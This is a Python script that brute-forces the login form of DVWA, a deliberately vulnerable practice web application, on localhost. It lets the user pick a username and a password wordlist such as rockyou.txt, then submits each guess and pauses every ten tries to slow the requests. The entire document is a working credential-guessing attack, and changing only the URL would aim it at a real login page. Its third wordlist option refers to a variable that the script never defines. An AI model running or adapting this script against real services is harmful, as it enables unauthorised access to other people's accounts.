
import mechanicalsoup
import time

print (""" 
██████  ██████  ██    ██ ████████ ███████     ███████  ██████  ██████   ██████ ███████ 
██   ██ ██   ██ ██    ██    ██    ██          ██      ██    ██ ██   ██ ██      ██      
██████  ██████  ██    ██    ██    █████       █████   ██    ██ ██████  ██      █████   
██   ██ ██   ██ ██    ██    ██    ██          ██      ██    ██ ██   ██ ██      ██      
██████  ██   ██  ██████     ██    ███████     ██       ██████  ██   ██  ██████ ███████                                                            
                                                                            
               
""")

browser = mechanicalsoup.StatefulBrowser()

browser.open("http://localhost/dvwa/login.php")
top1mil="wordlist_top1mil110000.txt"
rockyou="rockyou.txt"
 # darkcode="darkc0de.txt"     gives exception due to large size of the list..
probable_v2="probable-v2-top12000.txt"



count=0


username=input("please enter your username to bruteforce on:")
print("please choose a wordlist")
print("[1]-rockyou.txt")
print("[2]-top1million.txt,110000 words")
print("[3]-darkc0de wordlist,1.7 million words")
print("[4]-probable-v2-top12000.txt")
wordlist_Choice=input("choice:")
if(wordlist_Choice=="1"):
   Lines=open(rockyou,"r")
   Line=Lines.read().splitlines()
elif(wordlist_Choice=="2"):
    Lines=open(top1mil,"r")
    Line=Lines.read().splitlines()
elif(wordlist_Choice=="3"):
   Lines=open(darkcode,"r")
   Line=Lines.read().splitlines()
elif(wordlist_Choice=="4"):
   Lines=open(probable_v2,"r")
   Line=Lines.read().splitlines()
    

    

for guess in Line:
    count=count+1

    if count%10==0:
        time.sleep(3)





    browser.select_form('form[action="login.php"]')
    browser["username"]=username
    browser["password"]=guess
    
    C=str(count)
    

    response =browser.submit_selected()
    if "Welcome to Damn Vulnerable Web Application!" in response.text:
       print("["+C+"]"+" Trying Password[ {"+guess+"} ] --> Login Successful")
       break
    else:
        print("["+C+"]"+" Trying Password[ {"+guess+"} ] --> ""Login Failed")
       

